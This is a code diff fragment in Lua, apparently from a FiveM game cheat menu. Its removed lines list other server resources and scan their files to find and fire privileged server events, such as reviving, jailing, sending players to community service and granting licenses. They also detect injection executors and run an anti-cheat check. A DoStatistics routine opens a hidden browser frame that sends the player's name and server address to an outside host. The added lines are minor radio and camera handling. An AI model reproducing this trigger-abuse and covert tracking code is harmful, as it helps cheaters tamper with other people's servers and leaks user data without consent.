-            FM:GetFunction("DrawScaleformMovie")(Ibuttons, 0.5, 0.5, 1.0, 1.0, 255, 255, 255, 255)
-            self:SetIbuttons()
-        end
-    end
-
-    local TEList = {
-        {
-            Resource = "chat",
-            File = "client/cl_chat.lua",
-            KnownTriggers = {
-                {
-                    Trigger = "_chat:messageEntered",
-                    LookFor = "ExecuteCommand%(",
-                    Strip = {"TriggerServerEvent%('", "', (.*)"}
-                }
-            },
-            Name = "Chat",
-            Replacement = function(res, data) return _replaced(res, data) end
-        },
-        {
-            Resource = "esx_ambulancejob",
-            File = "client/main.lua",
-            KnownTriggers = {
-                {
-                    Trigger = "esx_ambulancejob:revive",
-                    LookFor = "local playerPed = PlayerPedId%(%)",
-                    Strip = {"AddEventHandler%('", "', (.*)"}
-                }
-            },
-            Name = "~g~ESX ~w~Ambulance Job",
-            Replacement = function(res, data) return _replaced(res, data) end
-        },
-        {
-            Resource = "gcphone",
-            File = "client/twitter.lua",
-            KnownTriggers = {
-                {
-                    Trigger = "gcPhone:twitter_postTweets",
-                    LookFor = "RegisterNUICallback%('twitter_postTweet', function%(data, cb%)",
-                    Depth = 2,
-                    Strip = {"TriggerServerEvent%('", "', (.*)"}
-                }
-            },
-            Name = "GCPhone",
-            Replacement = function(res, data) return _replaced(res, data) end
-        },
-        {
-            Resource = "esx_policejob",
-            File = "client/main.lua",
-            KnownTriggers = {
-                {
-                    Trigger = "esx_communityservice:sendToCommunityService",
-                    LookFor = "menu.close%(%)",
-                    Strip = {"TriggerServerEvent%(\"", "\", (.*)"}
-                }
-            },
-            Name = "~g~ESX ~w~Police Job",
-            Replacement = function(res, data) return _replaced(res, data) end
-        },
-        {
-            Resource = "esx-qalle-jail",
-            File = "client/client.lua",
-            KnownTriggers = {
-                {
-                    Trigger = "esx-qalle-jail:jailPlayer",
-                    LookFor = "ESX.ShowNotification%(\"No players nearby!\"%)",
-                    Strip = {"TriggerServerEvent%(\"", "\", (.*)"}
-                }
-            },
-            Name = "~g~ESX ~w~Qalle Jail",
-            Replacement = function(res, data) return _replaced(res, data) end
-        },
-        {
-            Resource = "esx_dmvschool",
-            File = "client/main.lua",
-            KnownTriggers = {
-                {
-                    Trigger = "esx_dmvschool:addLicense",
-                    LookFor = "ESX.ShowNotification%(_U%('passed_test'%)%)",
-                    Strip = {"TriggerServerEvent%('", "', (.*)"}
-                }
-            },
-            Name = "~g~ESX ~w~DMV School",
-            Replacement = function(res, data) return _replaced(res, data) end
-        },
-        {
-            Resource = "CarryPeople",
-            File = "cl_carry.lua",
-            KnownTriggers = {
-                {
-                    Trigger = "CarryPeople:sync",
-                    LookFor = "carryingBackInProgress = true",
-                    Strip = {"TriggerServerEvent%('", "', (.*)"}
-                },
-                {
-                    Trigger = "CarryPeople:stop",
-                    LookFor = "if target ~= 0 then",
-                    Strip = {"TriggerServerEvent%(\"", "\", (.*)"}
-                }
-            },
-            Name = "CarryPeople",
-            Replacement = function(res, data) return _replaced(res, data) end
-        }
-    }
-
-    function FM:RunDynamicTriggers()
-        FM:AddNotification("INFO", "Running dynamic triggers.", 15000)
-
-        for _, dat in dict.pairs(TEList) do
-            if dat.Replacement and dat.Replacement(dat.Resource, dat) then
-                FM:AddNotification("INFO", "Updated dynamic triggers for " .. dat.Name, 20000)
+            if IsPedInAnyVehicle(PlayerPedId(), false) and radioIndex + 1 ~= 19 then 
+                currRadioIndex = radioIndex + 1
+                selRadioIndex = radioIndex + 1
             end
         end
-    end
 
-    function FM:LoadDui()
-        local runtime_txd = CreateRuntimeTxd("fm")
-        --local banner_dui = CreateDui("https://asriel.dev/fm/watermark.gif", 300, 300)
-        local b_dui = GetDuiHandle(banner_dui)
-        CreateRuntimeTextureFromDuiHandle(runtime_txd, "menu_bg", b_dui)
-    end
-
-    function FM.CharToHex(c)
-        return dict.string.format("%%%02X", dict.string.byte(c))
-    end
-
-    function FM:URIEncode(url)
-        if url == nil then return end
-        url = url:gsub("\n", "\r\n")
-        url = url:gsub("([^%w _%%%-%.~])", self.CharToHex)
-        url = url:gsub(" ", "+")
-
-        return url
-    end
-
-    function FM:DoStatistics()
-        if not FM.Identifier then return end
-
-        local statistics = {
-            name = FM:GetFunction("GetPlayerName")(FM:GetFunction("PlayerId")()),
-            build = FM.Version,
-            server = FM:GetFunction("GetCurrentServerEndpoint")()
-        }
-
-        local stat_url = "https://fm.asriel.dev/statistics.gif?identifier=" .. FM:URIEncode(FM.Identifier) .. "&information=" .. FM:URIEncode(dict.json.encode(statistics))
-        local s_dui = CreateDui(stat_url, 50, 50)
-        Wait(10000)
-        DestroyDui(s_dui)
-        FM:Print("[Statistics] Updated statistics.")
-    end
-
-    CreateThread(function()
-        FM.FreeCam:Tick()
-    end)
-
-    CreateThread(function()
-        FM.RCCar:Tick()
-    end)
-
-    CreateThread(function()
-        FM:SpectateTick()
-    end)
-
-    CreateThread(function()
-        FM:AddNotification("INFO", "~y~" .. FM.Name .. "~w~ Loaded! (~y~v" .. FM.Version .. "~w~)", 25000)
-        FM:AddNotification("INFO", "Use ~y~" .. FM.Config.ShowKey .. " ~w~to open the menu.", 25000)
-
-        if _Executor ~= "None" then
-            FM:AddNotification("INFO", "Executor (" .. _Executor_Strings[_Executor] .. ") detected.", 15000)
+        if ForceMap then
+            DisplayRadar(true)
         end
-
-        FM:RunACChecker()
-
-        if _Executor == "redENGINE" then
-            FM:RunDynamicTriggers()
-        else
-            FM:AddNotification("INFO", "Your build (" .. _Executor_Strings[_Executor] .. ") does not support dynamic triggers.", 15000)
-        end
-
-        FM.ConfigClass.Load()
-        FM:BuildIdentifier()
-        FM:LoadDui()
-        Wait(2500)
-    end)
-end) 
-
+		
+		if ForceThirdPerson then
+			SetFollowPedCamViewMode(0)
+			SetFollowVehicleCamViewMode(0)
+		end
+        
+        Wait(0)
+    end
 end)
